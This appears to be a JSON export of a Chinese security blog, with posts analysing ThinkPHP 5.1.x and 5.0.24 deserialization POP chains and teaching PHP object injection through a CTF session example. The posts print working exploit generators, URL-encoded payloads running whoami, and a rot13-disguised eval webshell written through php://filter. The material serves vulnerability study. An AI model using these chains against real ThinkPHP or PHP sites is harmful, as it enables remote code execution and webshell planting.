[{"title":"ThinkPHP5.1.x反序列化链分析","url":"/2020/05/09/ThinkPHP5.1.x反序列化链分析/","content":"\n#### **环境搭建**\n\n利用composer下载tp5.1.37的环境\n\n```shell\ncomposer create-project --prefer-dist topthink/think thinkphp5.1.37\ncd thinkphp5.1.37\n修改composer.json文件里的为：topthink/framework\": \"5.1.37\n保存退出执行：composer update\n```\n\n要进行反序列化攻击，需要可控的unserialize，在index控制器中写入\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        $a = unserialize(input('c'));\n        var_dump($a);\n    }\n}    \n```\n\n#### **漏洞分析**\n\n这条链的前面部分跟tp5.0.24那条链一样，先全局查找\\_\\_destruct魔术方法，找到文件`/thinkphp/library/think/process/pipes/Windows.php`\n\n```php\npublic function __destruct()\n{\n    $this->close();\n    $this->removeFiles();\n}\n```\n\n跟进removeFiles方法，file_exists函数执行会把里里面的参数当做字符串，所以可以调用\\_\\_toString魔术方法。\n\n```php\nprivate function removeFiles()\n{\n    foreach ($this->files as $filename) {\n        if (file_exists($filename)) {\n            @unlink($filename);\n        }\n    }\n    $this->files = [];\n}\n```\n\n这里，全局查找\\_\\_toString，这里存在两条链，我们利用`\\thinkphp\\library\\think\\model\\concern\\Conversion.php`这条链来构造，这里要怎么调用到\\_\\_toString方法，而Conversion类是trait关键字声明的，无法被实例化。在类中，可以使用use关键字来继承这个Conversion类，全局查找Conversion类，发现`\\thinkphp\\library\\think\\Model.php`\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/1.png)\n\n抽象类不能被实例化，需要找他的子类，发现`\\thinkphp\\library\\think\\model\\Pivot.php`，所以payload为：\n\n```php\nnamespace think\\process\\pipes;\nuse think\\model\\Pivot;\nclass Windows\n{\n    private $files = [];\n\n    public function __construct()\n    {\n        $this->files=[new Pivot()];\n    }\n}\n\nnamespace think\\model;\nuse think\\Model;\nclass Pivot extends Model\n{\n}\n```\n\n继续跟进\\_\\_toString魔术方法中toJson->toArray()方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/2.png)\n\n当$relation可控的时候可以触发\\_\\_call方法，这里，$this->append可控就代表key和name可控，跟进getRelation方法看一下\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/3.png)\n\n当条件语句都不满足无任何返回，就继续跟进getAttr方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/4.png)\n\n这里始终都会执行getData，跟进这个函数\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/5.png)\n\n$this->data可控，就代表$relation变量可控，所以就可以触发\\_\\_call方法，全局查找一下。这里可以利用tprce那个那个类来触发命令执行。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/6.png)\n\n这里$this->hook[$method]是可控，而array_unshift函数会在$args数组前插入新元素，所以导致$args不可控，分析过tp5rce的都知道filterValue方法存在call_user_func可以构造rce。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/7.png)\n\n这里，怎么执行到filterValue，该类的input方法可以调用，但是input方法的参数不可控\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/8.png)\n\n需要查找哪里调用input方法了，发现param调用了input\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/9.png)\n\n这里$this->param可控，而name不可控，又需要查找哪里调用param方法\n\n```php\npublic function isAjax($ajax = false)\n{\n    $value  = $this->server('HTTP_X_REQUESTED_WITH');\n    $result = 'xmlhttprequest' == strtolower($value) ? true : false;\n\n    if (true === $ajax) {\n        return $result;\n    }\n\n    $result           = $this->param($this->config['var_ajax']) ? true : $result;\n    $this->mergeParam = false;\n    return $result;\n}\n```\n\n找到isAjax方法，$this->config可控，就代表param方法中的name参数可控，就代表input方法中data，name参数都可控，继续回到input方法查看第1373行，在filterValue方法$filters参数要可控\n\n```php\n$filter = $this->getFilter($filter, $default);\n```\n\n跟进getFilter方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/10.png)\n\n$this->filter可控就代表了filterValue方法$filters参数可控，所以组合起来，poc如下\n\n```php\n<?php\nnamespace think;\nabstract class Model{\n    protected $append;\n    private $data;\n    function __construct(){\n        $this->append = [\"aaaa\"=>[\"123456\"]];\n        $this->data = [\"aaaa\"=>new Request()];\n    }\n}\nclass Request\n{\n    protected $param;\n    protected $hook;\n    protected $filter;\n    protected $config;\n    function __construct(){\n        $this->filter = \"assert\";\n        $this->config = [\"var_ajax\"=>''];\n        $this->hook = [\"visible\"=>[$this,\"isAjax\"]];\n        $this->param = [\"phpinfo()\"];\n    }\n}\nnamespace think\\process\\pipes;\nuse think\\model\\Pivot;\nclass Windows\n{\n    private $files;\n\n    public function __construct()\n    {\n        $this->files=[new Pivot()];\n    }\n}\n\nnamespace think\\model;\nuse think\\Model;\nclass Pivot extends Model\n{\n}\nuse think\\process\\pipes\\Windows;\necho urlencode(serialize(new Windows()));\n?>\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/11.png)\n\n#### **影响版本**\n\n不同版本生成的exp不同，如下是影响版本：\n\n```\n5.1.3 < tp < 5.1.37\n```\n\n#### **参考文章**\n\n1.https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化\n\n2.https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md\n\n3.https://paper.seebug.org/1040/","tags":["代码审计"]},{"title":"对学校的某次渗透测试","url":"/2020/05/07/对学校的某次渗透测试/","tags":["渗透测试"]},{"title":"ThinkPHP5.0.24反序列化漏洞分析","url":"/2020/05/07/ThinkPHP5.0.24反序列化漏洞分析/","content":"\n这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        $c = unserialize($_GET['c']);\n        var_dump($c);\n        return 'Welcome to ThinkPHP!';\n    }\n}\n\n```\n\n#### **POP链构造分析**\n\n首先，进行全局搜索\\_\\_destruct，查看thinkphp/library/think/process/pipes/Windows.php的Windows类中调用了\\_\\_destruct魔术方法。\n\n```php\npublic function __destruct()\n{\n    $this->close();\n    $this->removeFiles();\n}\n```\n\n跟进removeFiles，发现file\\_\\_exists函数，file\\_\\_exists处理的时候会将当作字符串来处理，所以可以调用\\_\\_toString，全局搜索\\_\\_toString。\n\n```php\npublic function __toString()\n{\n     return $this->toJson();\n}\n```\n\n跟进toJson\n\n```php\npublic function toJson($options = JSON_UNESCAPED_UNICODE)\n{\n     return json_encode($this->toArray(), $options);\n}\n```\n\n继续跟进toArray方法，这里发现三处可以触发\\_\\_call方法。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/1.png)\n\n经过分析最后一处的参数可控，可以调用\\_\\_call方法，要执行到这里，要满足如下条件：\n\n$this->append可控且为数组，进入下面关键两行代码。\n\n```php\n$modelRelation = $this->$relation(); \n$value = $this->getRelationData($modelRelation);\n```\n\n$relation由$this->append控制，这里需要找个可控的点，在Model方法中getError方法可控\n\n```php\npublic function getError()\n{\n    return $this->error;\n}\n```\n\n跟进getRelationData方法，要满足if语句的条件就可以让value可控\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/2.png)\n\n通过全局搜索isSelfRelation，发现isSelfRelation方法是类Relation，而HasOne，OneToOne是Relation的子类，所以$modelRelation可以实例化HasOne类，继续都下面的代码，要满足：\n\n```php\nif (method_exists($modelRelation, 'getBindAttr'))\n```\n\n全局搜索getBindAttr，发现OneToOne中存在此方法，发现bindAttr可控\n\n```php\npublic function getBindAttr()\n{\n    return $this->bindAttr;\n}\n```\n\n最后value可控，执行`$item[$key] = $value ? $value->getAttr($attr) : null;`就可以调用到\\_\\_call方法，全局查看\\_\\_call，漏洞触发点在thinkphp/library/think/console/Output.php\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/3.png)\n\n跟进搜索block方法\n\n```php\nprotected function block($style, $message)\n{\n    $this->writeln(\"<{$style}>{$message}</$style>\");\n}\n```\n\n继续跟进writeln，在跟进write\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/4.png)\n\n这里发现$this->handle可控，可以进行全局搜索wirte方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/5.png)\n\n找到thinkphp/library/think/session/driver/Memcached.php文件中存在write方法，且$this->handle可控，继续全局查找set方法，在文件thinkphp/library/think/cache/driver/File.php发现存在写入文件。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/6.png)\n\n这里跟进getCacheKey方法，查看filename是否可控\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/7.png)\n\n这里$this->options可控，目前filename可控了，现在就只需要写入的data可控了，跟进setTagItem方法看一下，发现又执行了一次set。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/8.png)\n\n发现value的值就为传进来的filename。最后，整个的pop链就分析完了，贴上[安全客的一篇文章](https://www.anquanke.com/post/id/196364#h2-0)\n\n的pop链图。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/9.png)\n\n最后，poc如下：\n\n```php\n<?php\nnamespace think\\process\\pipes;\nuse think\\model\\Pivot;\nclass Pipes{\n\n}\n\nclass Windows extends Pipes{\n    private $files = [];\n\n    function __construct(){\n        $this->files = [new Pivot()];//触发Model __toString(),子类Pivot合适\n    }\n}\n\nnamespace think\\model;#Relation\nuse think\\db\\Query;\nabstract class Relation{\n    protected $selfRelation;\n    protected $query;\n    function __construct(){\n        $this->selfRelation = false;\n        $this->query = new Query();#class Query\n    }\n}\n\nnamespace think\\model\\relation;#OneToOne HasOne\nuse think\\model\\Relation;\nabstract class OneToOne extends Relation{\n    function __construct(){\n        parent::__construct();\n    }\n\n}\nclass HasOne extends OneToOne{\n    protected $bindAttr = [];\n    function __construct(){\n        parent::__construct();\n        $this->bindAttr = [\"no\",\"123\"];\n    }\n}\n\nnamespace think\\console;#Output\nuse think\\session\\driver\\Memcached;\nclass Output{\n    private $handle = null;\n    protected $styles = [];\n    function __construct(){\n        $this->handle = new Memcached();//目的调用其write()\n        $this->styles = ['getAttr'];\n    }\n}\n\nnamespace think;#Model\nuse think\\model\\relation\\HasOne;\nuse think\\console\\Output;\nuse think\\db\\Query;\nabstract class Model{\n    protected $append = [];\n    protected $error;\n    public $parent;#修改处\n    protected $selfRelation;\n    protected $query;\n    protected $aaaaa;\n\n    function __construct(){\n        $this->parent = new Output();#Output对象,目的是调用__call()\n        $this->append = ['getError'];\n        $this->error = new HasOne();//Relation子类,且有getBindAttr()\n        $this->selfRelation = false;//isSelfRelation()\n        $this->query = new Query();\n\n    }\n}\n\nnamespace think\\db;#Query\nuse think\\console\\Output;\nclass Query{\n    protected $model;\n    function __construct(){\n        $this->model = new Output();\n    }\n}\n\nnamespace think\\session\\driver;#Memcached\nuse think\\cache\\driver\\File;\nclass Memcached{\n    protected $handler = null;\n    function __construct(){\n        $this->handler = new File();//目的调用File->set()\n    }\n}\nnamespace think\\cache\\driver;#File\nclass File{\n    protected $options = [];\n    protected $tag;\n    function __construct(){\n        $this->options = [\n            'expire'        => 0,\n            'cache_subdir'  => false,\n            'prefix'        => '',\n            'path'          => 'php://filter/write=string.rot13/resource=./<?cuc cucvasb();riny($_TRG[pzq]);?>',\n            'data_compress' => false,\n        ];\n        $this->tag = true;\n    }\n}\n\nnamespace think\\model;\nuse think\\Model;\nclass Pivot extends Model{\n\n\n}\nuse think\\process\\pipes\\Windows;\necho urlencode(serialize(new Windows()));\n```\n\npoc只能对linux，windows限制了文件名，最后，文件的命名规则如下：\n\n```php\n<?cuc cucvasb();riny($_TRG[pzq]);?> + md5('tag_'.md5($this->tag))\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/10.png)\n\n#### **参考文章**\n\nhttps://www.anquanke.com/post/id/196364#h2-0\n\nhttp://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/\n\n","tags":["代码审计"]},{"title":"php反序列化到pop链构造","url":"/2020/04/26/php反序列化到pop链构造/","content":"\n#### **序列化与反序列化**\n\n在php中，使用serialize和unserialize两个函数表示序列化与反序列化。\n\n```\nserialize：把一个对象转化成字节流的字符串，序列化的对象会保存类的属性，不会保存方法\nunserialize：把字节流字符串转化成一个对象\n```\n\n看下下面的列子，通过serialize序列化返回字符串\n\n```php\n<?php\nclass A{\n    // 属性\n    public $name;\n    public $age;\n    public function __construct($name,$age){\n        $this->name = $name;\n        $this->age = $age;\n    }\n    // 方法\n    public function Skill(){\n        echo \"My name is \".$this->name.\",I am is \".$this->age.\" years old!<br>\";\n    }\n}\n$a = new A('fanxing','20');\necho serialize($a);\n?>\n```\n\n返回字节流的字符串\n\n```\nO:1:\"A\":2:{s:4:\"name\";s:7:\"fanxing\";s:3:\"age\";s:2:\"20\";}\n```\n\nO代表对象:长度:类的名字:类的属性个数:{类型:长度:属性名字;类型:长度:属性值;...}\n\n反序列化列子如下：\n\n```php\n<?php\nclass A{\n    // 属性\n    public $name;\n    public $age;\n    public function __construct($name,$age){\n        $this->name = $name;\n        $this->age = $age;\n    }\n    // 方法\n    public function Skill(){\n        echo \"My name is \".$this->name.\",I am is \".$this->age.\" years old!<br>\";\n    }\n}\n$a = unserialize('O:1:\"A\":2:{s:4:\"name\";s:7:\"fanxing\";s:3:\"age\";s:2:\"20\";}');\n$a->Skill();\n?>\n```\n\n打印出Skill方法中的值\n\n`My name is fanxing,I am is 20 years old!`\n\n#### **魔术方法**\n\n在学习php反序列漏洞前，都需要先了解php的魔术方法，常见的魔术方法如下：\n\n**__construct()**\t\n\n当一个对象被创建的时候调用该方法。\n\n**__destruct()**\n\n当一个对象被删除和销毁的时候调用。\n\n```php\n<?php\nclass A{\n    public function __construct(){\n        echo \"对象创建调用.<br>\";\n    }\n    public function __destruct(){\n        echo \"对象销毁调用\";\n    }\n}\n$a = new A();\n?>\n```\n\n**__toString**\n\n当一个对象被当成字符串的时候进行调用。\n\n```php\n<?php\nclass A{\n    public function __construct(){\n        echo \"对象创建调用.<br>\";\n    }\n    public function __toString(){\n        echo \"对象字符串调用\";\n        return \"1\";\n    }\n}\n$a = new A();\necho $a;\n?>\n```\n\n**__invoke**\n\n当一个对象以函数的方式进行调用的时候会被调用。\n\n```php\n<?php\nclass A{\n    public function __construct(){\n        echo \"对象创建调用.<br>\";\n    }\n    public function __invoke(){\n        echo \"对象以函数调用\";\n    }\n}\n$a = new A();\n$a();\n?>\n```\n\n**__sleep**\n\n对象在使用serialize函数前会先调用，在执行序列化的操作。\n\n**__wakeup**\n\n对象在使用unserialize函数前会先调用，在执行反序列化的操作。\n\n```php\n<?php\nclass A{\n    public function __construct(){\n        echo \"对象创建调用<br>\";\n    }\n    public function __sleep(){\n        echo \"序列化被调用<br>\";\n        return array();\n    }\n    public function __wakeup(){\n        echo \"反序列化被调用<br>\";\n    }\n}\n$a = new A();\n$s = serialize($a);\necho unserialize($s);\n?>\n```\n\n**__call**\n\n对象在调用不可访问的方法的时候触发\n\n**__callStatic**\n\n在静态中调用不可访问的方法的时候会触发\n\n**__set**\n\n给不可以访问的属性赋值被调用\n\n**__get**\n\n读取不可访问的属性值被调用\n\n**__isset**\n\n不可访问的属性调用为 isset() 或 empty()时被调用\n\n**__unset**\n\n对不可以访问的属性使用unset会被调用\n\n#### **对象注入**\n\n满足unserialize参数可控和类中存在魔法方法，并且存在危险函数既进行对象注入\n\n```php\n<?php\nclass A{\n    private $name;\n    public function __construct(){\n        echo \"对象创建调用<br>\";\n    }\n    public function __destruct(){\n        eval($this->name);\n    }\n}\n$a = unserialize($_GET['a']);\n?>\n```\n\n这里我们打印下序列化结果，发现属性的长度是7。\n\n```\nO:1:\"A\":1:{s:7:\"Aname\";N;}\n```\n\n这里需要注意的是成员属性使用的是private属性，在使用private和protected属性时，会在类名前后添加%00，即2个字符，使用urlencode打印出来看看。\n\n```\nO%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00name%22%3BN%3B%7D\n```\n\n同样，也可以加属性名前面添加\\00*\\00，构造下pyalod直接执行了任意代码\n\n```\nO%3A1%3A\"A\"%3A1%3A%7Bs%3A7%3A\"%00A%00name\"%3Bs%3A10%3A\"phpinfo%28)%3B\"%3B%7D\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/1.png)\n\n在举一个列子，这里使用__wakeup魔法方法来来绕过，涉及到一个CVE-2016-7124漏洞，该漏洞影响版本：\n\n```\nPHP5 < 5.6.25\nPHP7 < 7.0.10\n```\n\n举个列子\n\n```php\n<?php\nclass A{\n    private $name='phpinfo();';\n    public function __wakeup(){\n        $this->name = 'phpinfo();';\n    }\n    public function __destruct(){\n        eval($this->name);\n    }\n}\n$a = unserialize($_GET['a']);\n?>\n```\n\n__wakeup会在反序列化之前执行，所以怎么样对象被销毁的时候都是要执行phpinfo的，那怎么绕过\n\n__wakeup呢？需要构造如下序列化对象：\n\n```\nO%3A1%3A\"A\"%3A2%3A%7Bs%3A7%3A\"%00A%00name\"%3Bs%3A17%3A\"system%28\"whoami\"%29%3B\"%3B%7D\n```\n\n这里对象的属性个数是1，我设置为大于1就绕过了__wakeup，所以当序列化的结果的对象属性大于本身类的对象属性就可以绕过wakeup魔术方法。\n\n![2](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/2.png)\n\n#### **Session反序列化**\n\nphp的session在存储和读取的时候，会进行序列化和反序列化，在php中有3种序列化的方式，当在php.ini中设置如下值：\n\n| session.serialize_handler | 存储方式                                                     |\n| ------------------------- | ------------------------------------------------------------ |\n| php                       | 键名+竖线+经过serialize序列化的字符串                        |\n| php_serialize             | serialize序列化的的值                                        |\n| php_binary                | 键名的长度对应的 ASCII 字符＋键名＋经过serialize()函数反序列处理的值 |\n\n举个列子\n\n```php\n<?php\nini_set('session.serialize_handler','php');\nsession_start();\n$_SESSION['name'] = 'fanxing';\n?>\n```\n\n当session.serialize_handler为php的时候，存储的session结果为\n\n```\nname|s:7:\"fanxing\";\n```\n\n当session.serialize_handler为php_serialize的时候，存储的session结果为\n\n```\na:1:{s:4:\"name\";s:7:\"fanxing\";}\n```\n\n当session.serialize_handler为php_binary的时候，存储的session结果为\n\n```\n二进制字符串names:7:\"fanxing\"\n```\n\nphp大于5.5.4的版本默认使用的是php_serialize。\n\n在php.ini中，还要了解一些关于session的配置：\n\nsession.save_path\tsession保存的路径\n\nsession.upload_progress.cleanup\t上传完成后(POST)会立即删除进度，默认开启\n\nsession.upload_progress.enabled\t将上传的进度存于session，默认开启\n\n```\n当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。\n\n当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。\n```\n\n这里利用CTF的一道题目：http://web.jarvisoj.com:32784/index.php\n\n```php\n<?php\n//A webshell is wait for you\nini_set('session.serialize_handler', 'php');\nsession_start();\nclass OowoO\n{\n    public $mdzz;\n    function __construct()\n    {\n        $this->mdzz = 'phpinfo();';\n    }\n\n    function __destruct()\n    {\n        eval($this->mdzz);\n    }\n}\nif(isset($_GET['phpinfo']))\n{\n    $m = new OowoO();\n}\nelse\n{\n    highlight_string(file_get_contents('sessiontest.php'));\n}\n?>\n```\n\n可以看到题目使用的是php5.6.21，默认使用的是php_serialize，而题目使用的是php，所以可以利用session.upload_progress.enabled来构造session。\n\n```html\n<form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"<?php echo ini_get(\"session.upload_progress.name\"); ?>\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" />\n</form>\n```\n\n构造payload\n\n```php\n<?php\nclass OowoO\n{\n    public $mdzz='print_r(dirname(__FILE__));';\n}\n$b = new OowoO();\n$a = serialize($b);\necho $a;\n?>\n```\n\n在filename处提交payload：|O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:27:\\\"print_r(dirname(__FILE__));\\\";}\n\n![3](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/3.png)\n\n之后就可以构造payload读取本地的文件，具体可以参考[先知twosmi1e师傅](https://xz.aliyun.com/t/3674#toc-9)和博客[Mochazz师傅的文章](https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80)。\n\n#### **POP链构造**\n\n在反序列化攻击中，一般都要寻找魔术方法中的一些敏感函数来触发漏洞，当魔法方法中不存在敏感函数时，需要构造pop链寻找相同函数将类的属性和敏感函数联系到一起。\n\n这里，参考了这位[师傅](http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/)的题目，题目部分代码我删了下，看原题可以去连接看这位师傅的。\n\n```php\n<?php\nclass OutputFilter {\n    protected $matchPattern;\n    protected $replacement;\n    function __construct($pattern, $repl) {\n        $this->matchPattern = $pattern;\n        $this->replacement = $repl;\n    }\n    function filter($data) {\n        return preg_replace($this->matchPattern, $this->replacement, $data);\n    }\n};\nclass LogFileFormat {\n    protected $filters;\n    protected $endl;\n    function __construct($filters, $endl) {\n        $this->filters = $filters;\n        $this->endl = $endl;\n    }\n    function format($txt) {\n        foreach ($this->filters as $filter) {\n            $txt = $filter->filter($txt);\n        }\n        $txt = str_replace('\\n', $this->endl, $txt);\n        return $txt;\n    }\n};\nclass LogWriter_File {\n    protected $filename;\n    protected $format;\n    function __construct($filename, $format) {\n        $this->filename = str_replace(\"..\", \"__\", str_replace(\"/\", \"_\", $filename));\n        $this->format = $format;\n    }\n    function writeLog($txt) {\n        $txt = $this->format->format($txt);\n        //TODO: Modify the address here, and delete this TODO.\n        file_put_contents(\"D:\\\\phpStudy\\\\WWW\\\\ctf\" . $this->filename, $txt, FILE_APPEND);\n    }\n};\nclass Logger {\n    protected $logwriter;//这里装入LogWriter_File对象\n    function __construct($writer) {\n        $this->logwriter = $writer;\n    }\n    function log($txt) {//这里偷梁换柱Song的log\n        $this->logwriter->writeLog($txt);\n    }\n};\nclass Song {\n    protected $logger;\n    protected $name;\n    protected $group;\n    protected $url;\n    function __construct($name, $group, $url) {\n        $this->name = $name;\n        $this->group = $group;\n        $this->url = $url;\n        $fltr = new OutputFilter(\"/\\[i\\](.*)\\[\\/i\\]/i\", \"<i>\\\\1</i>\");\n        $this->logger = new Logger(new LogWriter_File(\"song_views\", new LogFileFormat(array($fltr), \"\\n\")));\n    }\n    function __toString() {\n        return \"<a href='\" . $this->url . \"'><i>\" . $this->name . \"</i></a> by \" . $this->group;\n    }\n    function log() {\n        $this->logger->log(\"Song \" . $this->name . \" by [i]\" . $this->group . \"[/i] viewed.\\n\");\n    }\n    function get_name() {\n        return $this->name;\n    }\n}\nclass Lyrics {\n    protected $lyrics;\n    protected $song;\n    function __construct($lyrics, $song) {\n        $this->song = $song;\n        $this->lyrics = $lyrics;\n    }\n    function __toString() {\n        return \"<p>\" . $this->song->__toString() . \"</p><p>\" . str_replace(\"\\n\", \"<br />\", $this->lyrics) . \"</p>\\n\";\n    }\n    function __destruct() {\n        $this->song->log();\n    }\n    function shortForm() {\n        return \"<p><a href='song.php?name=\" . urlencode($this->song->get_name()) . \"'>\" . $this->song->get_name() . \"</a></p>\";\n    }\n    function name_is($name) {\n        return $this->song->get_name() === $name;\n    }\n};\nclass User {\n    static function addLyrics($lyrics) {\n        $oldlyrics = array();\n        if (isset($_COOKIE['lyrics'])) {\n            $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics']));\n        }\n        foreach ($lyrics as $lyric) $oldlyrics []= $lyric;\n        setcookie('lyrics', base64_encode(serialize($oldlyrics)));\n    }\n    static function getLyrics() {\n        if (isset($_COOKIE['lyrics'])) {\n            return unserialize(base64_decode($_COOKIE['lyrics']));\n        }\n        else {\n            setcookie('lyrics', base64_encode(serialize(array(1, 2))));\n            return array(1, 2);\n        }\n    }\n};\n\nUser::getLyrics();\n```\n\n在进行反序列化漏洞的时候，我们需要找到可控的unserialize，这里发现$_COOKIE['lyrics']参数可控，有了可控的参数，就需要找到魔术方法来自动调用，这里危险函数在LogWriter_File这个类，这时就需要构造POP链了。\n\n首先来看魔术方法，在Lyrics类中存在两个魔术方法，发现对象在销毁的时候调用了$this->song->log()，而log方法又在Logger这个类中存在，所以属性$this->song应该为new Logger()。\n\n```php\nclass Lyrics {\n    protected $lyrics;\n    protected $song;\n    function __construct() {\n        $this->song = new Logger();\n        $this->lyrics = '111';\n    }\n    function __toString() {\n        return \"<p>\" . $this->song->__toString() . \"</p><p>\" . str_replace(\"\\n\", \"<br />\", $this->lyrics) . \"</p>\\n\";\n    }\n    function __destruct() {\n        $this->song->log();\n    }\n    function shortForm() {\n        return \"<p><a href='song.php?name=\" . urlencode($this->song->get_name()) . \"'>\" . $this->song->get_name() . \"</a></p>\";\n    }\n    function name_is($name) {\n        return $this->song->get_name() === $name;\n    }\n};\n```\n\n继续找，当实例化对象Lyricsde时，log方法存在$this->logwriter->writeLog，而writeLog又存在于LogWriter_File类中，这好这个类是我们的漏洞触发点，所以$this->logwriter应该为new LogWriter_Fil()，构造下payload：\n\n```php\nclass Logger {\n    protected $logwriter;\n    function __construct() {\n        $this->logwriter = new LogWriter_File('123.php');\n    }\n    function log($txt) {\n        $this->logwriter->writeLog($txt);\n    }\n};\n```\n\n实例化对象Logger之后，调用了LogWriter_File的writeLog方法，而写入文件的txt是通过$this->format->format获得，而format方法存在类LogFileFormat中，所以，构造如下payload：\n\n```php\nclass LogWriter_File {\n    protected $filename;\n    protected $format;\n    function __construct($filename) {\n        $this->filename = str_replace(\"..\", \"__\", str_replace(\"/\", \"_\", $filename));\n        $this->format = new LogFileFormat();\n    }\n    function writeLog($txt) { // 111\n        $txt = $this->format->format($txt);\n        //TODO: Modify the address here, and delete this TODO.\n        file_put_contents(\"D:\\\\phpStudy\\\\WWW\\\\ctf\" . $this->filename, $txt, FILE_APPEND);\n    }\n};\n```\n\n在类LogFileFormat中的format方法中利用$filter->filter来获取的$txt，而$filter是通过foreach获取的，所以$this->filters为一个数组，最终OutputFilter传入写入文件的内容，就可以构造如下payload：\n\n```php\nclass OutputFilter {\n    protected $matchPattern;\n    protected $replacement;\n    function __construct() {\n        $this->matchPattern = '//';\n        $this->replacement = '<?= `whoami`?>';\n    }\n    function filter($data) {\n        return preg_replace($this->matchPattern, $this->replacement, $data);\n    }\n};\n\nclass LogFileFormat {\n    protected $filters;\n    protected $endl;\n    function __construct() {\n        $this->filters = array(new OutputFilter());\n        $this->endl = '';\n    }\n    function format($txt) { // 111\n        foreach ($this->filters as $filter) {\n            $txt = $filter->filter($txt);\n            echo $txt;\n        }\n        $txt = str_replace('\\n', $this->endl, $txt);\n        return $txt;\n    }\n};\n```\n\n最后，将payload组合起来，利用serialize输出下序列化的结果\n\n![4](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/4.png)\n\n```\nO%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22111%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A14%3A%22%3C%3F%3D+%60whoami%60%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D\n```\n\n在base64下通过cookie传入就可以写入ctf123.php了\n\n![5](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/5.png)\n\n#### **参考文章**\n\n1.http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/\n\n2.https://xz.aliyun.com/t/3674#toc-9\n\n3.https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80","tags":["代码审计"]},{"title":"获取域控的方法","url":"/2020/02/26/获取域控的方法/","content":"\n#### 